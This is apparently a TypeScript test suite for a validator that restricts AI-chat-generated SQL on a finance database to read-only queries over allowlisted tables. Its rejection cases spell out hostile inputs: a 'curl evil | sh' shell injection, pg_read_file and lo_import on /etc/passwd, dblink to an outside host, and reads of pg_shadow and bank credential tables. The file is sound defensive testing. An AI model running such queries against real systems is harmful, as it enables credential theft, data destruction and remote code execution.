import assert from 'node:assert/strict';
import test from 'node:test';
import {
  CHAT_ROW_CAP,
  CHAT_TABLE_COLUMNS,
  buildScopedQuery,
  validateChatSql,
} from './chatSqlValidator';

function rejected(sql: string): string {
  const result = validateChatSql(sql);
  assert.equal(result.ok, false, `expected rejection for: ${sql}`);
  return result.ok ? '' : result.reason;
}

function accepted(sql: string): string {
  const result = validateChatSql(sql);
  assert.ok(result.ok, `expected acceptance for: ${sql} (${result.ok ? '' : result.reason})`);
  return result.ok ? result.sql : '';
}

test('validateChatSql accepts ordinary reporting SELECTs', () => {
  accepted(
    `SELECT c.name, ROUND(SUM(-t."chargedAmount")::numeric, 2) AS spent FROM "Transaction" t ` +
      `JOIN "Category" c ON c.id = t."categoryId" WHERE c.type = 'EXPENSE' AND t."isTransfer" = false ` +
      `AND t.date >= date_trunc('month', CURRENT_DATE) GROUP BY c.name ORDER BY spent DESC LIMIT 10`,
  );
  accepted(`SELECT COUNT(*) FROM "Transaction";`);
  accepted(
    `WITH m AS (SELECT to_char(date, 'YYYY-MM') AS month, SUM("chargedAmount") AS net FROM "Transaction" GROUP BY 1) ` +
      `SELECT month, net FROM m ORDER BY month`,
  );
  accepted(`SELECT a."displayName", a.balance, a.currency FROM "Account" a`);
  accepted(
    `SELECT b.amount, c.name FROM "Budget" b JOIN "Category" c ON c.id = b."categoryId" ` +
      `UNION ALL SELECT 0, 'none'`,
  );
  accepted(`SELECT description FROM "Transaction" WHERE description ILIKE '%it''s%'`);
});

test('validateChatSql re-serializes the parsed statement (comments are not carried over)', () => {
  const sql = accepted(`SELECT 1 -- ; DROP TABLE "Budget"\n`);
  assert.doesNotMatch(sql, /DROP/i);
});

test('validateChatSql rejects writes, DDL and session changes', () => {
  for (const sql of [
    `UPDATE "Budget" SET amount = 0`,
    `DELETE FROM "Transaction"`,
    `INSERT INTO "Category"(name, type) VALUES ('x', 'EXPENSE')`,
    `DROP TABLE "Transaction"`,
    `CREATE TABLE x (id int)`,
    `ALTER TABLE "Budget" ADD COLUMN x int`,
    `TRUNCATE "Transaction"`,
    `GRANT ALL ON "BankCredential" TO PUBLIC`,
    `SET statement_timeout = 0`,
    `COPY "Transaction" TO '/tmp/x'`,
    `WITH d AS (DELETE FROM "Budget" RETURNING *) SELECT * FROM d`,
    `SELECT * FROM "Transaction" FOR UPDATE`,
    `SELECT * INTO newtable FROM "Transaction"`,
  ]) {
    rejected(sql);
  }
});

test('validateChatSql rejects multiple statements and shell-style injection strings', () => {
  for (const sql of [
    `SELECT 1; SELECT 2`,
    `SELECT 1; DELETE FROM "Budget"`,
    `SELECT 1"; curl evil | sh; echo "`,
    `SELECT $(id)`,
    "SELECT `id`",
    `SELECT 1 /* */ ; COMMIT; DROP TABLE "Budget"`,
    ``,
    `   `,
    `SELECT $1`,
  ]) {
    rejected(sql);
  }
});

test('validateChatSql rejects dangerous or unknown functions', () => {
  for (const sql of [
    `SELECT pg_read_file('/etc/passwd')`,
    `SELECT pg_catalog.pg_read_file('x')`,
    `SELECT * FROM dblink('host=evil', 'select 1') AS t(a int)`,
    `SELECT set_config('default_transaction_read_only', 'off', false)`,
    `SELECT pg_sleep(10)`,
    `SELECT current_setting('data_directory')`,
    `SELECT lo_import('/etc/passwd')`,
    `SELECT * FROM generate_series(1, 100000000)`,
    `SELECT version()`,
    `SELECT current_user`,
    `SELECT public.sum(1)`,
  ]) {
    rejected(sql);
  }
});

test('validateChatSql rejects sensitive and non-allowlisted tables', () => {
  for (const sql of [
    `SELECT * FROM "BankCredential"`,
    `SELECT "encryptedData" FROM "BankCredential" b JOIN "User" u ON u.id = b."userId"`,
    `SELECT 1 WHERE EXISTS (SELECT 1 FROM "BankCredential")`,
    `SELECT * FROM public."Transaction"`,
    `SELECT * FROM pg_catalog.pg_authid`,
    `SELECT * FROM pg_shadow`,
    `SELECT * FROM information_schema.tables`,
    `SELECT * FROM "_prisma_migrations"`,
    `SELECT * FROM "IngestionLease"`,
    // Persisted chat history (card #66): the model must not read it via SQL.
    `SELECT * FROM "ChatMessage"`,
    `SELECT question, answer FROM "ChatMessage" WHERE status = 'completed'`,
    `SELECT title FROM "ChatConversation"`,
    `SELECT t.id FROM "Transaction" t JOIN "ChatMessage" m ON m.question = t.description`,
    `SELECT 1 WHERE EXISTS (SELECT 1 FROM "ChatConversation")`,
    `SELECT * FROM chatmessage`,
    `SELECT * FROM transaction`,
    `SELECT email FROM "User"`,
  ]) {
    rejected(sql);
  }
});

test('the persisted chat history tables are not on the chat allowlist', () => {
  for (const table of Object.keys(CHAT_TABLE_COLUMNS)) assert.doesNotMatch(table, /^chat/i);
});

test('validateChatSql rejects CTEs that would shadow the scoped tables', () => {
  rejected(`WITH "Transaction" AS (SELECT 1 AS id) SELECT * FROM "Transaction"`);
  rejected(`WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r) SELECT n FROM r`);
});

test('validateChatSql rejects over-long input', () => {
  rejected(`SELECT ${'1 + '.repeat(3000)}1`);
});

test('buildScopedQuery wraps the statement in scoped CTEs with a row cap and the household filter param', () => {
  const sql = accepted(`SELECT COUNT(*) AS n FROM "Transaction"`);
  const scoped = buildScopedQuery(sql, { userId: 'user-1' });
  assert.deepEqual(scoped.params, ['user-1']);
  assert.match(scoped.text, /"Transaction" AS NOT MATERIALIZED \(/);
  assert.match(scoped.text, /FROM public\."Transaction"/);
  assert.match(scoped.text, /"isCardSettlement" = false/);
  assert.match(scoped.text, /\$1::text IS NULL OR/);
  assert.match(scoped.text, new RegExp(`LIMIT ${CHAT_ROW_CAP + 1}$`));
  assert.doesNotMatch(scoped.text, /BankCredential|accountNumber|txnIdentifier|email/);

  const unscoped = buildScopedQuery(sql, {});
  assert.deepEqual(unscoped.params, [null]);
});

test('buildScopedQuery appends typed-tool parameters after the household filter', () => {
  const scoped = buildScopedQuery('SELECT 1 FROM "Transaction" WHERE date >= $2', {
    userId: null,
    params: [new Date('2026-01-01T00:00:00Z')],
  });
  assert.equal(scoped.params.length, 2);
  assert.equal(scoped.params[0], null);
});
